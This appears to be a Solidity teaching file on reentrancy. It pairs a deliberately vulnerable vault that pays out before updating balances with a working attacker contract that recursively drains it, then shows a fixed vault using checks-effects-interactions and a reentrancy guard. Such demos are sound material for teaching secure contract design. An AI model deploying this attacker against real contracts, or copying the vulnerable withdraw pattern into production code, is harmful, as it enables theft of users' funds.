// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/* ===========================================================================
   VARIANT 1 — SINGLE-FUNCTION REENTRANCY   (the classic "The DAO" bug)
   ---------------------------------------------------------------------------
     1. Deploy VulnerableVault. From two "honest" accounts, deposit() 3 ETH each.
     2. Deploy ReentrancyAttacker(vaultAddress).
     3. Call attacker.attack() with 1 ETH.
     4. Show VulnerableVault balance == 0 and the attacker holding ~7 ETH.
     5. Repeat against SafeVault -> the re-entrant call reverts, nothing is drained.
   The whole drain happens inside ONE transaction.
   =========================================================================== */

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/* ----------------------------- VULNERABLE -------------------------------- */
contract VulnerableVault is IVault {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // BUG: the external call (INTERACTION) happens BEFORE the state update (EFFECT).
    function withdraw() external {
        uint256 amount = balanceOf[msg.sender];
        require(amount > 0, "nothing to withdraw");

        (bool ok, ) = msg.sender.call{value: amount}("");   // <-- control leaves here
        require(ok, "ETH send failed");

        balanceOf[msg.sender] = 0;                           // <-- too late
    }

    function totalETH() external view returns (uint256) {
        return address(this).balance;
    }
}

/* ------------------------------ ATTACKER --------------------------------- */
contract ReentrancyAttacker {
    IVault public immutable vault;
    uint256 public seed;

    constructor(address vaultAddress) {
        vault = IVault(vaultAddress);
    }

    // Seed a small deposit, then start the withdrawal that recurses.
    function attack() external payable {
        require(msg.value > 0, "seed with some ETH");
        seed = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    // Each time the vault pays us, re-enter withdraw() before it can zero our balance.
    receive() external payable {
        if (address(vault).balance >= seed) {
            vault.withdraw();
        }
    }

    // Move stolen ETH out to the owner for inspection.
    function sweep(address to) external {
        (bool ok, ) = to.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}

/* ------------------------- DEFENSE (mutex) ------------------------------- */
// Minimal ReentrancyGuard — mirrors OpenZeppelin's. In production, import:
//   import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status = _NOT_ENTERED;

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}

/* ------------------------------- SAFE ------------------------------------ */
contract SafeVault is IVault, ReentrancyGuard {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // FIX #1 Checks-Effects-Interactions: zero the balance BEFORE the call.
    // FIX #2 nonReentrant: even a cross-path re-entry reverts.
    function withdraw() external nonReentrant {
        uint256 amount = balanceOf[msg.sender];
        require(amount > 0, "nothing to withdraw");

        balanceOf[msg.sender] = 0;                           // EFFECT first
        (bool ok, ) = msg.sender.call{value: amount}("");    // INTERACTION last
        require(ok, "ETH send failed");
    }

    function totalETH() external view returns (uint256) {
        return address(this).balance;
    }
}
